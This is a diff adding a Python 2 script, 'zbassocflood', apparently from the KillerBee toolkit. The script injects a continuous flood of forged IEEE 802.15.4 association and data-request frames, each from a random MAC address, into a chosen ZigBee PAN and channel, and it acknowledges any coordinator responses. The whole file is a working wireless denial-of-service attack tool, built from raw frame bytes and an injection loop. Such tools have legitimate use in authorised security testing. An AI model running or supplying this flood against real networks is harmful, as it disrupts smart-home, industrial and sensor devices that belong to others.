@@ -1,0 +1,196 @@
+#!/usr/bin/env python
+import sys
+import os
+import signal
+import time
+from killerbee import *
+
+
+def usage():
+    print >>sys.stderr, """
+zbassocflood: Transmit a flood of associate requests to a target network.
+jwright@willhackforsushi.com
+
+Usage: zbassocflood [-pcDis] [-i devnumstring] [-p PANID] [-c channel]
+                        [-s per-packet delay/float]
+
+e.x. zbassocflood -p 0xBAAD -c 11 -s 0.1
+    """
+
+def show_dev():
+    kb = KillerBee()
+    print "Dev\tProduct String\tSerial Number"
+    for dev in kb.dev_list():
+        print "%s\t%s\t%s" % (dev[0], dev[1], dev[2])
+
+def interrupt(signum, frame):
+    global kb
+    global txcount
+    kb.close()
+    print "\nSent %d associate requests."%txcount
+    sys.exit(0)
+
+# Watch for an association response
+# Default timeout is 1 second
+def watchforaresp(kb, timeout=1):
+    d154 = Dot154PacketParser()
+    kb.sniffer_on()
+
+    start = time.time()
+    while (start+timeout > time.time()):
+        recvpkt = kb.pnext()
+        if recvpkt != None and recvpkt[1]:
+            d154list = d154.pktchop(recvpkt[0])
+
+            fcf = struct.unpack("<H", d154list[0])[0]
+            if (fcf & DOT154_FCF_TYPE_MASK) != DOT154_FCF_TYPE_MACCMD:
+                continue
+
+            # Command Frame ID is the first byte of the payload
+            if d154list[7][0] != "\x02":
+                continue
+
+            kb.sniffer_off()
+            return d154list[1] # seq#
+
+    # No matching packet seen within timeout
+    kb.sniffer_off()
+    return None
+
+if __name__ == '__main__':
+
+    # Command-line arguments
+    arg_panid = None
+    arg_devstring = None
+    arg_verbose = False
+    arg_channel = None
+    arg_framedelay = 0.1
+
+    txcount = 0
+
+    # Assoc Request
+    assocreq = "\x23\xc8\x41\x0b\xc7\x00\x00\xff" \
+                "\xff\x00\x00\x00\x00\x00\x00\x00\x00\x01\x8e"
+
+    # Association Request Frame in list form, split where we need to modify
+    assocreqp = [ "\x23\xc8",
+                    "", # Seq num
+                    "", # Dest PANID
+                    "\x00\x00", # Destination (coordinator)
+                    "\xff\xff", # Source PAN (broadcast)
+                    "", # Address field
+                    "\x01\x8e\x67" # Command Frame payload/assoc req
+                ]
+
+    # Data Request Frame in list form, split where we need to modify
+    datareqp = [ "\x63\xc8",   # FC (intra PAN set)
+                    "", # Seq num
+                    "", # Dest PANID
+                    "\x00\x00", # Destination (coordinator)
+                    "", # Source ext address
+                    "\x04" # Command Frame data request
+                ]
+
+    # ACK Frame in list form, split where we need to modify
+    ackp = [ "\x02\x00",    # FC 
+                    ""      # ACK'd seq num
+                ]
+
+
+    while len(sys.argv) > 1:
+        op = sys.argv.pop(1)
+        if op == '-i':
+            arg_devstring = sys.argv.pop(1)
+        if op == '-h':
+            usage()
+            sys.exit(0)
+        if op == '-s':
+            arg_framedelay = float(sys.argv.pop(1))
+        if op == '-c':
+            arg_channel = int(sys.argv.pop(1))
+        if op == '-p':
+            arg_panid = sys.argv.pop(1)
+        if op == '-D':
+            show_dev()
+            sys.exit(0)
+
+    if not arg_channel:
+        print("Must specify a channel with -c")
+        usage()
+        sys.exit(-1)
+
+    if not arg_panid:
+        print("Must specify a PANID with -p")
+        usage()
+        sys.exit(-1)
+
+    kb = KillerBee(device=arg_devstring)
+    signal.signal(signal.SIGINT, interrupt)
+
+    print "zbassocflood: Transmitting and receiving on interface \'%s\'" % kb.get_dev_info()[0]
+    
+    # Sequence number of assoc frame
+    kb.set_channel(arg_channel)
+
+    # Dest PAN ID
+    dstpanid = struct.pack("H", int("0x" + arg_panid[-4:], 16))
+    assocreqp[2] = dstpanid
+    datareqp[2] = dstpanid
+
+    # Loop injecting and receiving packets
+    seqnum = 0
+    while 1:
+        if seqnum > 254:                        # 254 to accommodate datareq
+            seqnum = 0
+    
+        mac = randmac()
+
+        assocreqp[1] = "%c" % seqnum            # ;)
+        assocreqp[5] = mac
+        assocreqinj = ''.join(assocreqp)
+
+        seqnum += 1
+        datareqp[1] = "%c" % seqnum
+        datareqp[4] = mac
+        datareqinj = ''.join(datareqp)
+
+        try:
+            # Send the associate request frame
+            kb.inject(assocreqinj)
+            time.sleep(0.05) # Delay between assoc and data requests
+
+            # Send the data request frame
+            kb.inject(datareqinj)
+        except Exception, e:
+            print "ERROR: Unable to inject packet"
+            print e
+            sys.exit(-1)
+
+        try:
+            # Listen for the ACK response
+            seq = watchforaresp(kb, arg_framedelay*10)
+        except Exception, e:
+            print e
+            print "ERROR: Unable to handle response processing."
+            print e
+            sys.exit(-1)
+
+        try:
+            if seq != None:
+                ackp[1] = seq
+                ackinj = ''.join(ackp)
+                kb.inject(ackinj)
+                sys.stdout.write("+")
+                sys.stdout.flush()
+            else:
+                sys.stdout.write(".")
+                sys.stdout.flush()
+
+            txcount+=1
+            time.sleep(arg_framedelay)
+        except Exception, e:
+            print "ERROR: Unable to handle ACK response."
+            print e
+            sys.exit(-1)
+
+        seqnum += 1
